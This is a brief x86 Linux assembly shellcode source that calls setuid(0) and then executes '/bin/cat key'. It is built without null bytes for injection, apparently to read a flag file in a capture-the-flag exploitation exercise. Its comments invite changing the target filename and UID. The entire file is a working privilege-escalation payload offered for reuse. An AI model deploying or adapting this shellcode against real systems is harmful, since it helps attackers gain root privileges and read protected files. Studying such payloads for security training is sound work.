	;; setuid(0) + execv("/bin/cat", ["/bin/cat", "key"], NULL)
	;; You can change the filename and the UID		

	section .text
	global _start

	%define SYS_SETUID 23
	%define SYS_EXECV 11
	%define SYS_EXIT 1
_start:
	xor eax,eax
	mov al, SYS_SETUID
	xor ebx,ebx
	; mov bx, 1000
	int 0x80

	xor edx,edx
	push edx
	push dword '/cat'
	push dword '/bin'
	mov ebx,esp
	push dword 'key'
	mov ecx,esp

	push edx
	push ecx
	push ebx
	mov ecx,esp

	xor eax,eax
	mov al,SYS_EXECV
	int 0x80
	
	
